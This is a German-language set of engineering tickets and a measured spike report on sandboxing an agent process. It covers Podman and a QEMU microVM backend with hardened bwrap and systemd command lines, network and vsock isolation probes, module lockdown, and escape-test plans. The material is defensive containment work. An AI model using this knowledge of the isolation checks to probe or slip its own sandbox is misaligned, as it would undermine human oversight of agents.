5. Nach einem Wunsch über den Start (`cli_overrides` mit `sandbox.backend`, HUM-432) werden die Obergrenzen aus dem Host auf der zusammengeführten Konfiguration erneut geprüft, nicht nur beim Laden des Daemons.

### Tests
- Unit: `sandbox.backend = "podman"` startet (mit Attrappe), `podman` mit `runtime = "krun"` scheitert weiter mit `SANDBOX_048`.
- Der Zulassungstest aus HUM-431 wird umgedreht: er erwartet jetzt `podman` in der Liste und `krun` nicht.

### Akzeptanzkriterien
1. `humanitl run --backend podman` und die Einstellung starten eine Sitzung; die Oberfläche kann es ab HUM-440.
2. Der Commit ändert keine Zeile außerhalb der Zulassungsliste, ihrer Tests und der zwei Sicherheitsdokumente.

### Fallstricke
- Nicht vor einem grünen `escape-tests-podman` auf genau dem Stand von `main`, auf dem der Commit aufsetzt.

## HUM-440 · Oberfläche: Backend-Wahl mit Isolationsstufe in Einstellungen und Start

### Kontext
Der Inhaber will die Wahl auch in der Oberfläche. ADR-0018: UI ist dünner Client; alles kommt aus `SandboxBackends` (HUM-432).

### Spezifikation
1. Einstellungen: Auswahl `sandbox.backend` mit je einem Satz zur Stufe („gemeinsamer Kernel, Namensräume" oder „eigener Kernel in einer Micro-VM") und, bei nicht verfügbaren Backends, dem `why` und `fix` aus dem RPC; Schreiben über `SetConfig`.
2. Start einer Sitzung: Backend für diese Sitzung wählbar (`cli_overrides`), Vorgabe der Einstellung; die Untergrenze des Projekts wird angezeigt und schränkt die Liste ein.
3. Sandbox-Bildschirm zeigt Backend und Stufe der laufenden Sitzung.
4. Was nicht zugelassen ist (`SANDBOX_048`), zeigt die Oberfläche nicht als Wahl; `podman` erscheint nach HUM-448, die Kernel-Stufe (seit HUM-442 `qemu`) erst mit HUM-447.
5. Texte über ARB (`en` Quelle, `de` Übersetzung), nur eigener Abschnitt, angehängt.

### Tests
- Widget: nicht verfügbares Backend ist nicht wählbar und zeigt den Grund; ein Backend unter der Untergrenze ebenso.
- Widget mit Fake: Wahl schreibt `SetConfig` mit `sandbox.backend`.
- Golden für die Auswahl in hell und dunkel.

### Akzeptanzkriterien
1. Keine Prüfung in Dart, die nicht aus dem RPC kommt.
2. Bildschirmfoto im Commit-Body, Designprüfung vor dem Landen (Wunsch des Inhabers vom 2026-11-01).

### Fallstricke
- `flutter test` läuft als Android; plattformabhängige Teile mit `TargetPlatformVariant`.
- `app/l10n/*.arb` ist gemeinsam genutzt: neu einlesen, nur anhängen.

## HUM-441 · Doku: Podman in README, CONFIG, cli; Nachträge ADR-0002, ADR-0010, ADR-0015; ADR-0020 angenommen

### Kontext
Die Sicherheitsdokumente wachsen mit dem Code (HUM-430, HUM-433, HUM-434, HUM-437 bis HUM-439). Was übrig bleibt, ist die Zusammenschau.

### Spezifikation
1. `README.md`: zwei Sätze zu den Stufen beider Backends.
2. `docs/cli.md`: `sandbox backends`, `--backend`, `--podman-runtime`, `sandbox image pull`.
3. Nachträge: ADR-0002 (Podman statt Docker als zweites Linux-Backend), ADR-0010 (`podman` und `uidmap` als `Recommends` im `.deb`, nie `Depends`; Unit nach HUM-434), ADR-0015 (Port-Tabelle: `bwrap`, `seatbelt`, `podman`).
4. ADR-0020 auf `Accepted` (nach HUM-448), `docs/adr/check.sh` und Index nachgezogen.
5. `packaging/deb/control.in`: `Recommends` ergänzt.

### Tests
- `bash scripts/ci/lint-docs.sh`, `python3 scripts/ci/check-doc-links.py`, `docs/adr/check.sh --self-test`.

### Akzeptanzkriterien
1. Jede Aussage über Podman in README und Website ist durch Code und `docs/SECURITY.md` gedeckt.
2. Das Paket installiert ohne Podman und funktioniert mit bwrap.

### Fallstricke
- `README.md` hat zwölf Pflichtabschnitte in fester Reihenfolge (`lint-docs.sh`).

## HUM-442 · Spike Kernel-Stufe: Weiterleitung, vsock-Tür, Kanäle des VMM, Startzeit, KVM in der CI

### Kontext
Die Kernel-Stufe sollte Podman mit der Laufzeit `krun` sein. libkrun ist in Debian nicht paketiert; der Inhaber hat am 2026-11-13 entschieden, dass die Stufe nur aus Paketen der Distribution entsteht: QEMU `-M microvm` mit virtiofsd und vhost-device-vsock, Podman nur noch für OCI-Abbilder. Der Spike prüft, ob dieser Weg die drei Garantien trägt. Kippt er eine davon, stoppt die Kernel-Stufe und geht zurück an den Inhaber.

### Spezifikation
1. Messen, mit Root im Gast und ohne Filter: Netzgeräte im Gast, Tür über genau einen vsock-Port, fremde CIDs und Ports abgewiesen, Kanäle des VMM, Pinning des Projektordners über virtiofs, Inodes, Modulsperre, Startzeit, alles unter einer gehärteten transienten Unit des Nutzers.
2. Entscheidung als ADR-0021, Nachtrag in ADR-0020, beide auch auf Deutsch; die Issues HUM-443 bis HUM-449 neu geschnitten.

### Tests
- Keine im Repository; Belege sind die Ausgaben unten. Der Prototyp liegt außerhalb von `main`.

### Akzeptanzkriterien
1. Jede Frage aus Punkt 1 hat einen Beleg oder ist mit Grund offen.
2. ADR-0021 nennt den Weg, die verworfenen Alternativen und die Folgen.

### Ergebnis (2026-11-13)

Referenzmaschine: Debian forky/sid, Kernel 7.3.4+deb14-amd64, i7-8550U mit VT-x, Nutzer in der Gruppe `kvm`. Pakete: `qemu-system-x86` 11.1.3, `virtiofsd` 1.14.0, `vhost-device-vsock` 0.3.0, `bubblewrap` 0.13.1. Gast: der laufende Kernel des Hosts, `init` ein statisches Testprogramm als Root ohne seccomp, die Wurzel ein von bwrap zusammengesetztes, nur lesbares `/usr` über virtiofs, `/work` ein Testordner über einen zweiten virtiofsd.

Startzeile von QEMU in den Messläufen Q1 bis Q7 (gekürzt auf das, was zählt; dort mit `-nographic -serial stdio` und `console=ttyS0`, damit die Ausgabe des Gasts lesbar ist, also mit der Konsole als Kanal zum Host; die Endform ohne Konsole steht unter Q8):

```
qemu-system-x86_64 -M microvm,pcie=on,acpi=on -accel kvm -cpu host -smp 1 -m 512 \
  -no-reboot -nodefaults -no-user-config -nographic -nic none \
  -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny \
  -object memory-backend-memfd,id=mem,size=512M,share=on -machine memory-backend=mem \
  -kernel /boot/vmlinuz-$(uname -r) -append "rootfstype=virtiofs root=rootfs ro init=/init" \
  -chardev socket,id=fs0,path=$R/root.sock -device vhost-user-fs-pci,chardev=fs0,tag=rootfs \
  -chardev socket,id=fs1,path=$R/work.sock -device vhost-user-fs-pci,chardev=fs1,tag=work \
  -chardev socket,id=vs,path=$R/vsock.sock -device vhost-user-vsock-pci,chardev=vs
```

QEMU, beide virtiofsd und vhost-device-vsock liefen je in einem bwrap-Gefängnis mit `--unshare-all --cap-drop ALL`, QEMU mit `--dev-bind /dev/kvm /dev/kvm` und `/boot` nur lesbar; vhost-device-vsock mit `--guest-cid 3 --uds-path $R/door --groups s442`, auf dem Host ein Lauscher nur an `$R/door_5000`.

| # | Frage | Beleg |
|---|---|---|
| Q1 | Netzgerät im Gast? | `/sys/class/net`: nur `lo`. `connect` nach `1.1.1.1:443`: `errno=101 Network is unreachable` |
| Q2 | Genau ein vsock-Port? | CID 2 Port 5000: `connect ok`, Antwort `door-reply:hello-door` vom Host-Socket. CID 2 Port 5001, CID 2 Port 22, CID 1 Port 5000, CID 4 Port 5000: je `errno=110 Connection timed out`, keine Verbindung |
| Q3 | Kanäle des VMM? | `/proc/<qemu>/fd` im Messlauf mit Konsole: `/dev/kvm`, `kvm-vm`, `kvm-vcpu:0`, `kvm-vcpu-stats:0`, 23 eventfd, 2 io_uring, 1 signalfd, 4 Unix-Sockets (vhost-user), `/dev/null`, ein gelöschtes memfd, dazu die Standardausgabe als Konsole (`-serial stdio`). Kein `/dev/vhost-vsock`, kein `/dev/net/tun`, kein tap. Die Endform (Q8) hat keine Konsole |
| Q4 | Erreicht ein nach der Prüfung vertauschter Projektordner den Gast? | Nein. Ordner geöffnet (`exec 7<project`), dann umbenannt und durch einen neuen ersetzt; virtiofsd in bwrap mit `--bind-fd 7 /share` und `--shared-dir /share --sandbox none`: der Gast sieht `pin` mit Inode 377185, dem geöffneten Ordner; der neue trägt 377774. Ohne bwrap scheitert `--shared-dir /proc/self/fd/7 --sandbox namespace` mit `OpenNewRoot ... No such file or directory` |
| Q5 | Inodes über virtiofs? | Gleich, für einen Eintrag (`pin`: 377185) wie für die Wurzel des Einhängens (`/work`: 376298 auf Host und Gast); Gerätenummer verschieden (43 Host, 28 oder 30 Gast, je nach Zahl der virtiofs-Einhängungen). Die Prüfung im Gast vergleicht also den Inode der Wurzel und den Typ `virtiofs` mit dem Tag, nicht die Gerätenummer des Hosts |
| Q6 | Kann Root im Gast nach dem Start Module laden? | Nein. `finit_module` mit `MODULE_INIT_COMPRESSED_FILE` lädt `vsock`, `vmw_vsock_virtio_transport_common`, `vmw_vsock_virtio_transport` als `.ko.xz` aus dem `/usr/lib/modules` des Hosts (`CONFIG_MODULE_DECOMPRESS=y`); danach `kernel.modules_disabled = 1`, ein weiteres `finit_module`: `Operation not permitted` |
| Q7 | Gehärtete transiente Unit? | Endform (Befehl unten): `systemd-run --user` mit `PrivateNetwork=yes`, `PrivateUsers=yes`, `NoNewPrivileges=yes`, `CapabilityBoundingSet=`, `ProtectSystem=strict`, `ProtectHome=read-only`, `RestrictAddressFamilies=AF_UNIX AF_NETLINK`, `LockPersonality`, `RestrictRealtime`, `SystemCallArchitectures=native`: alle Belege Q1 bis Q6 unverändert, `Finished with result: success`. bwrap läuft im Namensraum der Unit weiter. Alle vier Prozesse je in einem bwrap-Gefängnis; QEMU sieht aus `/boot` nur die Kernel-Datei |
| Q8 | Startzeit? | Endform ohne Konsole, drei Läufe: vom Aufruf von `systemd-run` bis zur ersten Verbindung des Gasts an der Tür 2,20 s, 2,24 s, 2,16 s; davon ab dem Start von QEMU 2,04 s, 2,03 s, 2,03 s (Debian-Generic-Kernel, SeaBIOS; Module laden, sperren und `/work` einhängen eingeschlossen). Zum Vergleich eine Unit derselben Art mit einem bwrap-Gefängnis, das `true` startet: 43 ms, 39 ms, 41 ms |
| Q9 | Erreicht ein Gast einen anderen Gast? | Zwei Gäste (CID 3 wählt, CID 4 lauscht auf Port 6000). Ein vhost-device-vsock-Prozess für beide, Gruppe `g1`: Verbindung kommt zustande (Positivkontrolle, `ACCEPTED a sibling connection`). Je Gast ein eigener Prozess, beide mit dem Gruppennamen `g1`: `errno=110 Connection timed out`, der Lauscher sieht nichts. Beide Fälle unter der Unit aus Q7 (`run-sib.sh`). Gruppen wirken nur innerhalb eines Prozesses; die Trennung trägt der eigene Prozess je Sitzung |
| Q10 | Steuerkanal vom Host in den Gast? | Endform: der Gast lauscht auf vsock-Port 6000; der Host verbindet sich mit `<uds>` und schreibt `CONNECT 6000`; Antwort `OK 6000`, danach Daten in beide Richtungen (`host-control` beim Gast, `guest-ack` beim Host). Der Gast selbst öffnet diesen Kanal nicht |
| Q11 | KVM und Pakete in der CI? | Weg festgelegt in HUM-465, belegt mit dem ersten grünen Lauf des Jobs `kvm-tests`: ein gehosteter Runner `ubuntu-24.04` ohne Container, `/dev/kvm` über eine udev-Regel freigegeben. Was Ubuntu 24.04 nicht oder zu alt liefert, kommt als Debian-Binärpaket mit fester sha256 und wird nur ausgepackt oder mit `dpkg -i` installiert, nie gebaut: `vhost-device-vsock` 0.3.0-2, `virtiofsd` 1.13.2 (Ubuntus 1.10 kennt `--readonly` nicht) und der Gastkernel aus Debians Cloud-Kernel 6.12 (der Kernel des Runners, `linux-azure`, hat `CONFIG_VIRTIO_FS=m` und bootet ohne initramfs keine virtiofs-Wurzel) |

Endform (Q7, Q8): ein Lauf mit allen Proben, als Root ohne Filter und ohne Konsole, unter der Unit aus Q7. `J` ist `bwrap --unshare-all --die-with-parent --new-session --cap-drop ALL --ro-bind /usr /usr --symlink usr/lib /lib --symlink usr/lib64 /lib64 --symlink usr/bin /bin --proc /proc --dev /dev`:

```
# Wurzel: der Socket kommt als Deskriptor 3, das Laufzeitverzeichnis ist im Gefängnis nicht sichtbar
J --tmpfs /tmp --dir /work --dir /sys --dir /run --ro-bind init /init \
  virtiofsd --shared-dir / --fd 3 --sandbox none --readonly
# /work: Ordner öffnen, dann den Pfad vertauschen, dann virtiofsd auf den Deskriptor
exec 7<project; mv project project-orig; mv project-new project
J --bind $R $R --bind-fd 7 /share virtiofsd --shared-dir /share --socket-path $R/work.sock --sandbox none
J --bind $R $R vhost-device-vsock --guest-cid 3 --socket $R/vsock.sock --uds-path $R/door --groups s<pid>
# Steuerkanal: der Host schreibt CONNECT 6000 an $R/door
J --bind $R $R --dev-bind /dev/kvm /dev/kvm --ro-bind /boot/vmlinuz-$(uname -r) /kernel \
  qemu-system-x86_64 ... -display none -serial none -monitor none -nic none -kernel /kernel ...
# alles in:
systemd-run --user --wait --pipe -p PrivateNetwork=yes -p PrivateUsers=yes -p NoNewPrivileges=yes \
  -p CapabilityBoundingSet= -p ProtectSystem=strict -p ProtectHome=read-only \
  -p RestrictAddressFamilies="AF_UNIX AF_NETLINK" -p LockPersonality=yes -p RestrictRealtime=yes \
  -p SystemCallArchitectures=native run-final.sh
```

Ausgabe (gekürzt um die Kopfzeilen von `systemd-run`):

```
HOST unit netns links: lo
HOST opened project: root ino=376298 pin ino=377185
HOST after swap, path now: root ino=384931 pin ino=384932
HOST qemu fds: 33×anon_inode:[eventfd] 2×anon_inode:[io_uring] 1×anon_inode:kvm-vcpu 1×anon_inode:kvm-vcpu-stats
  1×anon_inode:kvm-vm 1×anon_inode:[signalfd] 1×(deleted) 1×/dev/kvm 1×/dev/null 2×pipe: 5×socket:
GUEST modules load: 0 0 0
GUEST modules_disabled=1, later finit_module: Operation not permitted
GUEST netdevs: lo
GUEST inet 1.1.1.1:443: Network is unreachable
GUEST vsock 2:5001: Connection timed out
GUEST vsock 2:22: Connection timed out
GUEST vsock 1:5000: Connection timed out
GUEST vsock 4:5000: Connection timed out
GUEST vsock 3:5000: No such device
GUEST work mount=0 root ino=376298 pin ino=377185 pin content=pin
HOST control: OK 6000 / guest-ack
GUEST control from host: host-control
          Finished with result: success
```

Die zwei Pipes sind Standardausgabe und Standardfehler der Unit (`--pipe`), die fünf Sockets die vhost-user-Verbindungen der drei Geräte. Startzeit (Q8) aus drei Läufen derselben Endform ohne die Proben mit Timeout (`FAST=1`): erste Verbindung des Gasts an der Tür 2,20 s, 2,24 s, 2,16 s nach dem Aufruf von `systemd-run`, 2,04 s, 2,03 s, 2,03 s nach dem Start von QEMU.

Weitere Befunde:
- Das Laufzeitverzeichnis der Sitzung darf in der Wurzel des Gasts nicht stehen; der Socket des virtiofsd für die Wurzel kommt deshalb als Deskriptor (`--fd`), nicht als Pfad in dessen Gefängnis.
- Unix-Socket-Pfade sind auf 108 Byte begrenzt; das Laufzeitverzeichnis der Sitzung muss kurz sein (unter `$XDG_RUNTIME_DIR`, nicht unter einem Projekt- oder Temp-Pfad beliebiger Länge).
- Ein dynamisch gelinktes Programm aus einem OCI-Abbild läuft nur mit dessen glibc; die Wurzel aus dem Plan (Host-`/usr`) braucht kein initrd und keinen statischen Shim.
- Ubuntu installiert `/boot/vmlinuz-*` mit `0600`; dort fehlt die Stufe, bis der Nutzer `sandbox.qemu.kernel` setzt (HUM-464).
- Der Gast antwortet auf nicht vorhandene vsock-Ziele mit Timeout statt Ablehnung; das kostet nur Zeit, keine Garantie.

Entscheidung: [ADR-0021](../docs/adr/0021-qemu-microvm-kernel-level.md). Keine der drei Garantien kippt, unter der Bedingung aus Q9: je Sitzung ein eigener vhost-device-vsock-Prozess; die Kernel-Stufe geht weiter, neu geschnitten in HUM-464, HUM-465 und HUM-443 bis HUM-449.

## HUM-464 · Konfiguration und Port: Backend `qemu`, Gruppe `sandbox.qemu`, `krun` entfernt

### Kontext
ADR-0021 ersetzt die Laufzeit `krun` durch ein eigenes Backend. Zuerst kommen Schlüssel, Port und Diagnosen, ohne dass ein Start möglich ist.

### Spezifikation
1. `sandbox.backend` bekommt `qemu` (Stufe `kernel`), nur unter Linux auf x86-64; unter macOS lehnt es wie `bwrap` ab.
2. Neue Gruppe `sandbox.qemu` (`x-project-scope = "denied"`): `cpus` und `memory_mib` (Vorgaben wie `sandbox.podman`), `kernel` (Pfad eines Kernel-Abbilds, leer: `/boot/vmlinuz-$(uname -r)`), `modules` (Verzeichnis der Module dieses Kernels, leer: `/usr/lib/modules/<release>`), `start_timeout_secs`, und je Programm ein absoluter Pfad (`qemu`, `virtiofsd`, `vhost_device_vsock`; leer: Suche im `PATH`, `virtiofsd` zusätzlich `/usr/libexec/virtiofsd`).
3. `sandbox.podman.runtime` verliert `krun`; der Wert wird beim Laden mit einem `CONFIG`-Diagnostic abgelehnt, dessen `fix` `sandbox.backend = "qemu"` nennt. Proto, CLI (`--podman-runtime`) und App folgen.
4. Diagnosen: `SANDBOX_045` Voraussetzung der Kernel-Stufe fehlt (`/dev/kvm`, ein Programm oder eine Fähigkeit davon, geprüft an der Hilfe des Programms statt an einer Versionsnummer: virtiofsd `--readonly` und `--fd`, vhost-device-vsock `--uds-path` und `--groups`, QEMU `microvm` und `vhost-user-vsock-pci`, bwrap `--bind-fd`; Kernel-Abbild nicht lesbar, Modulverzeichnis fehlt), mit der fehlenden Voraussetzung in `why` und dem Paket in `fix`; `SANDBOX_046` Tür der Kernel-Stufe nicht aufgebaut; `SANDBOX_047` Host-Prüfung des VMM gescheitert. Registriert in `codes.rs` und `docs/DIAGNOSTICS.md`.
5. `qemu` steht in der Liste der Backends (`humanitl sandbox backends`, RPC) mit Stufe `kernel`, `available = false` und `SANDBOX_048` bis HUM-449, zusätzlich `SANDBOX_045` mit dem ersten Fehlenden.
6. `tools/coupling-baseline.toml` bekommt den Abschnitt `[qemu]` für `qemu`, `virtiofsd`, `vhost-device-vsock` und `microvm` außerhalb von `daemon/crates/sandbox/src/qemu/`; der Abschnitt `[podman]` sinkt um die `krun`-Stellen.

### Tests
- Unit Konfiguration: `qemu` mit `min_isolation = "kernel"` lädt; `podman` mit `min_isolation = "kernel"` scheitert mit `SANDBOX_035`; `runtime = "krun"` scheitert beim Laden mit dem neuen Code und dessen `fix`.
- Unit Backend-Liste: `qemu` ist `kernel`, nicht verfügbar, mit `SANDBOX_048`.
- Mutationsbeweis: `qemu` in `ADMITTED_BACKENDS` färbt den Test der Zulassung rot.

### Akzeptanzkriterien
1. Kein Weg startet `qemu` vor HUM-449, außer über `detect_unadmitted`.
2. Kein Schlüssel nennt `krun` mehr; ein alter Wert führt zu einem `Diagnostic` mit Weg.

### Fallstricke
- `sandbox.min_isolation = "kernel"` war bisher nur mit `podman` und `krun` erfüllbar; Tests und Texte, die das sagen, ziehen mit, auch die Tests aus HUM-448, die `runtime = "krun"` mit `SANDBOX_048` erwarten: sie erwarten danach das `CONFIG`-Diagnostic.

## HUM-465 · Shim im Gast: Module laden und sperren, Tür über vsock

### Kontext
Unter ADR-0021 ist der Shim PID 1 eines Gastkernels. Bevor er die Garantien prüft, muss er die vsock-Module laden, das Laden weiterer Module sperren und die Tür vom Gast-Loopback auf vsock abbilden.

### Spezifikation
1. Gast-Modus des Shims, gewählt über ein Argument im Plan, nie über die Umgebung des Agenten: `proc`, `sys`, `dev` einhängen; `vsock`, `vmw_vsock_virtio_transport_common`, `vmw_vsock_virtio_transport` aus dem Modulverzeichnis des Plans per `finit_module` mit `MODULE_INIT_COMPRESSED_FILE` laden (unkomprimierte Dateien ebenso); `kernel.modules_disabled = 1`; schlägt eins davon fehl, endet der Shim mit einer `CHECK`-Zeile und der Gast geht aus.
2. Der Shim lauscht auf `127.0.0.1:3128` und reicht jede Verbindung an CID 2, Tür-Port aus dem Plan weiter; Ende einer Seite schließt beide.
3. `/work` per virtiofs einhängen; die Mounttabelle mit dem Plan vergleichen wie HUM-437, mit dem Gast-Gerät des virtiofs-Einhängens statt der Gerätenummer des Hosts (Q5).
4. Filter: Der Shim selbst braucht nach dem Einsetzen seines Filters für jede Anfrage einen neuen `AF_VSOCK`-Socket. Im Gast-Modus erlaubt der Filter des Shims (heute die Brücke mit `AF_UNIX`) statt `AF_UNIX` die Familie `AF_VSOCK`; der Filter des Agenten verweigert `AF_VSOCK` und `AF_UNIX` außerhalb der Brücke weiter. Danach unverändert: `CHECK`-Zeilen, `exec` des Agenten.
5. Für Tests ohne den Adapter aus HUM-444 bekommt `daemon/crates/sandbox/src/qemu/` einen Startweg nur für Tests (Gast mit Shim als `init`, Wurzel aus einem festen Plan), und die CI einen Job `kvm-tests` auf einem gehosteten Linux-Runner mit `/dev/kvm` und den Debian-Paketen aus Q11. HUM-444 baut daraus den Adapter, HUM-445 die Escape-Suite im selben Job.

### Tests
- Unit: Aufbau der Modulpfade, Reihenfolge Laden vor Sperren, Abbruch bei Fehler.
- Integration unter KVM im Job `kvm-tests` (übersprungen ohne KVM, rot unter `STRICT=1` nur in diesem Job): Shim als `init`, Tür antwortet auf eine Anfrage, die nach dem Einsetzen des Filters gestellt wird, Modulsperre gesetzt, Agent ohne `AF_VSOCK`.
- Mutationsbeweis: Sperre entfernt färbt die Probe „Modul nach dem Start laden" rot; `AF_VSOCK` im Filter des Shims verboten färbt die Anfrage nach dem Filter rot.

### Akzeptanzkriterien
1. Nach dem Start des Agenten lädt kein Prozess im Gast ein Modul, auch nicht als Root.
2. Der Agent erreicht den Proxy nur über `127.0.0.1:3128` und den einen vsock-Port.

### Fallstricke
- Der Shim läuft als PID 1; endet er, gibt es eine Kernel-Panik und mit `-no-reboot` und `panic=-1` das Ende der VM. Das ist die Lebensleine im Gast, kein Fehler.

## HUM-443 · Shim: Steuerkanal als Strom, Terminal und weitere Shells im Gast

### Kontext
In einer VM überquert kein Deskriptor die Grenze: Das PTY kann nicht vom Daemon kommen, `SCM_RIGHTS` für weitere Shells (HUM-299) geht nicht, ein Host-Signal erreicht keinen Gastprozess. Der Shim braucht einen zweiten, erklärten Kanal, der als Strom läuft.

### Spezifikation
1. Ein gerahmtes Protokoll auf einem Strom-Socket (im Gast `AF_VSOCK`: der Daemon verbindet sich über das `CONNECT` von vhost-device-vsock mit dem Port, an dem der Shim lauscht, ADR-0021; in Tests ein Unix-Socket-Paar): Nachrichten für Terminal-Bytes je Kanal, Größe, Shell öffnen und schließen, Exit, Interrupt, Lebenszeichen; feste Höchstlängen, unbekannte Kennungen verworfen, wie die Tür heute.
2. Der Shim öffnet PTYs im Gast; die Seite des Daemons (`shell.rs`, `TerminalHub`) bekommt eine zweite Quelle neben dem Master-Deskriptor.
3. `EOF` auf dem Steuerkanal ist die Lebensleine der Kernel-Stufe.
4. Der seccomp-Filter des Agenten verweigert `AF_VSOCK` weiter; der Shim öffnet den Kanal vor dem Filter.
5. `docs/THREAT-MODEL.md`: K-Eintrag für den Steuerkanal (trägt keinen Netzverkehr, nur Terminal und Steuerung), K-18 um den Strom-Modus ergänzt; `docs/SECURITY.md` Abschnitt 4 „Further shells" beschreibt den Strom-Modus.

### Tests
- Shim-Unit: Protokoll mit Fuzz-Eingaben (übergroße Rahmen, unbekannte Kennungen) verwirft und bleibt stabil; `cargo fuzz`-Ziel für den Leser auf der Daemon-Seite.
- Integration unter bwrap mit dem Strom-Modus erzwungen: Terminal, Größe, zweite Shell, Detach und Attach wie mit dem Deskriptor-Modus.
- Mutationsbeweis: die Längenprüfung entfernt färbt den Fuzz-Regressionstest rot.

### Akzeptanzkriterien
1. Beide Modi (Deskriptor, Strom) bestehen dieselben Terminal-Tests.
2. Über den Steuerkanal geht kein Byte an den Proxy und keines von ihm; ESC-1 prüft im Strom-Modus, dass der Agent keinen `AF_VSOCK`-Socket öffnet.

### Fallstricke
- Der Shim läuft ohne tokio; PTYs, Steuerkanal und Lebenszeichen gehören in eine `poll`-Schleife statt in einen Faden je PTY, damit das Lesen der Rahmen an einer Stelle steht und geprüft werden kann.

## HUM-444 · QEMU-Adapter: Plan, Start in Gefängnissen, Ende, Host-Prüfung, doctor

### Kontext
ADR-0021: je Sitzung eine transiente Unit des Nutzers mit vier Prozessen in je einem bwrap-Gefängnis. Die Garantien müssen mit Root im Gast halten; die Prüfungen im Gast sind dann Tiefenverteidigung.

### Spezifikation
1. Adapter `daemon/crates/sandbox/src/qemu/` hinter `SandboxBackend`, `isolation()` ist `Kernel`. `detect` prüft jede Voraussetzung aus HUM-464 (`SANDBOX_045`).
2. Plan: die Wurzel des Gasts aus demselben Plan wie unter bwrap (Profil-Einhängungen, Shim, CA), gebaut als bwrap-Gefängnis, in dem virtiofsd `/` nur lesbar ausliefert; `/work` über einen zweiten virtiofsd mit dem geprüften Ordner per `--bind-fd`; vhost-device-vsock als eigener Prozess je Sitzung, nie für zwei Sitzungen geteilt (HUM-442, Q9), mit eigener Gruppe und `--uds-path` im Laufzeitverzeichnis der Sitzung, nie `--forward-cid`; der virtiofsd der Wurzel bekommt seinen Socket als Deskriptor (`--fd`), damit das Laufzeitverzeichnis nicht in der Wurzel des Gasts steht; QEMU sieht aus `/boot` nur die Kernel-Datei; QEMU mit der Startzeile aus HUM-442 ohne Konsole, Monitor und Anzeige, `-sandbox` voll, `/dev/kvm` als einziges Gerät, vCPU und Speicher aus `sandbox.qemu`. Der Daemon legt genau einen Lauscher `<uds>_<Tür-Port>` an, der an den Proxy-Socket der Sitzung reicht.
3. Start über den Dienstmanager des Nutzers (HUM-434) mit den Eigenschaften aus Q7; Ende: Unit stoppen, Laufzeitverzeichnis entfernen; ein Rest einer früheren Sitzung wird beim Start des Daemons entfernt (`SANDBOX_041`). Endet der Daemon, endet die Unit, ohne dass der Gast mitwirken muss: `BindsTo` auf die Unit des Daemons, außerhalb einer Unit eine Lebensleine auf dem Host (eine Pipe, deren Schreibende nur der Daemon hält; bei EOF stoppt der erste Prozess der Unit sie). Root im Gast kann das Ende des Steuerkanals übergehen; die Lebensleine im Gast ist nur Tiefenverteidigung.
4. `isolation_check` liest die `CHECK`-Zeilen aus dem Gast über den Steuerkanal (HUM-443); endet die VM ohne Bericht (etwa weil ein vsock-Modul nicht lädt), ist das eine gescheiterte Prüfung mit eigenem Grund, nie ein Erfolg. Dazu prüft der Daemon auf dem Host: Netz-Namensraum jedes Prozesses der Unit nur `lo`, Deskriptoren von QEMU nur die aus Q3 ohne Konsole, kein `/dev/vhost-vsock`, kein `tun`, im Laufzeitverzeichnis nur die erklärten Sockets, genau ein vhost-device-vsock-Prozess mit genau einem Gerät. Scheitert die Host-Prüfung: `SANDBOX_047`, Sitzung gestoppt.
5. `humanitl doctor` je Voraussetzung eine Zeile, Probestart der Stufe mit `DOCTOR_015` bei Fehlschlag.
6. `docs/SECURITY.md` neuer Abschnitt „Linux: QEMU micro-VM (kernel level)" mit den drei Garantien für die Stufe; `docs/THREAT-MODEL.md` K-Einträge für VMM, vsock-Tür, Gastkernel und die vier Hilfsprozesse.
7. Liest `sandbox.qemu.cpus`, `sandbox.qemu.memory_mib`, `sandbox.qemu.kernel`, `sandbox.qemu.modules`, `sandbox.qemu.start_timeout_secs`, `sandbox.qemu.qemu`, `sandbox.qemu.virtiofsd`, `sandbox.qemu.vhost_device_vsock`; `config_readers.rs` stuft sie danach als `effective` ein.

### Tests
- Unit: Startzeilen der vier Prozesse enthalten die festen Optionen; eine Verbotsliste prüft, dass keine Netzoption, kein `-netdev`, kein `-serial` außer `none`, kein `--forward-cid`, kein zweites `--vm` und kein zweiter Lauscher vorkommt.
- Integration: der Daemon wird mit `SIGKILL` beendet; die Unit der Sitzung ist binnen 5 s weg.
- Integration unter KVM im Job `kvm-tests` aus HUM-465: Sitzung startet über `detect_unadmitted`, Terminal funktioniert, Host-Prüfung grün.
- Mutationsbeweis: ein zusätzlicher Lauscher `<uds>_22` färbt die Host-Prüfung rot; ein `-nic user` färbt `no_interfaces` oder die Host-Prüfung rot.

### Akzeptanzkriterien
1. Die drei Garantien gelten mit Root im Gast (belegt in HUM-445).
2. Fehlt eine Voraussetzung, startet nichts, und das `Diagnostic` nennt sie; kein Rückfall auf ein anderes Backend.
3. Für Nutzer bleibt `qemu` mit `SANDBOX_048` gesperrt, bis HUM-449 landet.

### Fallstricke
- Vor der Modulsperre lädt der Gastkernel Module selbst nach (`/sbin/modprobe` aus dem Modulverzeichnis des Hosts, wenn die Release passt); der Shim setzt `kernel.modprobe` auf einen leeren Pfad, bevor er etwas einhängt, damit nur die Module des Plans geladen werden (HUM-465).
- Ein fest eingebautes Modul erscheint nur dann unter `/sys/module`, wenn es Parameter oder eine Version hat; der Shim scheitert dann geschlossen (HUM-465). Debian und Ubuntu bauen vsock als Modul; ein Kernel mit eingebautem vsock bekommt erst mit einem gemessenen Fall eine andere Prüfung.
- Ein Kernel mit `CONFIG_VIRTIO_FS=m` (Ubuntus `linux-azure` und vermutlich weitere Ubuntu-Kernel) bootet ohne initramfs keine virtiofs-Wurzel; `doctor` prüft `CONFIG_VIRTIO_FS=y` in der Konfiguration des Kernels (`/boot/config-*` oder `/proc/config.gz`) und nennt sonst `sandbox.qemu.kernel` (HUM-465).
- virtiofsd ab 1.11 kündigt Submounts an: die Einhängepunkte des Wurzel-Gefängnisses erscheinen im Gast erst beim Zugriff als eigene virtiofs-Einhängungen. Der Plan braucht eine feste Regel, entweder `--no-announce-submounts` oder die Einträge in der erwarteten Tabelle (HUM-465).
- Das `/proc` des virtiofsd-Gefängnisses ist in der Wurzel des Gasts sichtbar, bevor der Shim sein eigenes darüber hängt; geteilt wird besser ein Unterverzeichnis des Gefängnisses statt `/` (HUM-465).
- Die Probe `single_socket` läuft im Gast in ihr Eintragslimit (2000, `limit=entries`), weil die Wurzel das ganze Host-`/usr` ist; der Plan begrenzt die Suche auf die beschreibbaren Orte oder hebt das Limit für die Kernel-Stufe (HUM-465).
- Socket-Pfade höchstens 108 Byte (HUM-442): das Laufzeitverzeichnis liegt unter `$XDG_RUNTIME_DIR` und hat einen kurzen Namen.
